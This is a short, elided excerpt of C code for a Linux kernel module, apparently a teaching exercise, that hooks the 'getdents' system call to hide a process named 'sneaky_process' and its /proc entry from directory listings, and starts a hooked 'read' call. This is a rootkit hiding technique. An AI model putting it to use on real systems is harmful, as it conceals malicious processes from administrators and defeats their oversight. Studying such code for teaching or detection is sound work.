...
//Define our new sneaky version of the 'getdents' system call
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  ...
  //hide "sneaky_process" and /proc/<sneaky_process_id>
  if (ret>0){
    td = dirp;
    tmp = ret;
    while (tmp > 0) 
    {
      tmp -= td->d_reclen;
      if(strcmp(td->d_name, "sneaky_process") == 0 ||
        strcmp(td->d_name, pid) == 0){
        ret -= td->d_reclen;
        if(tmp){
...
//Define our new sneaky version of the 'read' system call
